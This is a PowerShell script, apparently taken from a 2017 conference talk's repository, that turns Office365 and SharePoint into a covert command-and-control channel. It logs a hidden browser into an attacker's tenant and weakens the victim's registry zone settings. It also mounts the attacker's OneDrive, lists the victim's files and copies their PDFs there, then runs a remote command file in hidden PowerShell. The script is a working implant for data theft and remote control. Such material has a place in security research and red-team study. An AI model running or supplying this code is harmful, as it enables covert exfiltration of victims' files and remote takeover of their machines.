#Detailed Guide: https://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf
#Original Script: https://github.com/craigdods/C2-SaaS/blob/master/Single-Stage.ps1

$Username = "badguy@EVILER.onmicrosoft.com";
$Password = "Password1";
$URL = "portal.office.com";
Get-Process iexplore -EA SilentlyContinue | Stop-Process;
$ie = New-Object -com InternetExplorer.Application;
$ie.visible = $False;
$ie.navigate($URL);
while($ie.ReadyState -ne 4) {start-sleep -m 100};
$ie.document.getElementById("cred_userid_inputtext").value= "$username";
$ie.document.getElementById("cred_password_inputtext").value = "$password";
$ie.document.getElementById("cred_keep_me_signed_in_checkbox").Checked = $True;
while($ie.ReadyState -ne 4) {start-sleep -m 100};
$ie.document.getElementById("cred_userid_inputtext").click();
$ie.document.getElementById("cred_password_inputtext").click();
$ie.document.getElementById("cred_sign_in_button").click();
$baddomain="eviler-my";
set-location "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\";
new-item sharepoint.com;
set-location "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\sharepoint.com";
new-item $baddomain;
set-location "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\sharepoint.com\eviler-my";
new-itemproperty . -Name https -Value 2 -Type DWORD;
new-itemproperty . -Name http -Value 2 -Type DWORD;
new-itemproperty . -Name * -Value 2 -Type DWORD;
$password = convertto-securestring -String 'Password1' -AsPlainText -Force ;
$Creds = new-object -typename System.Management.Automation.PSCredential('badguy@eviler.onmicrosoft.com', $password) ;
New-PSDrive -Name J -PSProvider FileSystem -Root '\\eviler-my.sharepoint.com@SSL\DavWWWRoot\personal\badguy_eviler_onmicrosoft_com\Documents' -Credential $Creds;
$Domain=$env:UserDomain;
$Storage="J:\$Domain\Uploads";
cd J: ;
mkdir $Domain;
cd $Domain;
mkdir Uploads;
Get-ChildItem -Recurse C:\Users\$env:USERNAME > $Storage\Current_File_List.txt;
Get-Childitem C:\Users\$User -recurse -filter "*.pdf" | %{Copy-Item -Path $_.FullName -Destination $Storage};
Get-Content J:\todays-commands.txt | powershell.exe -windowstyle hidden;
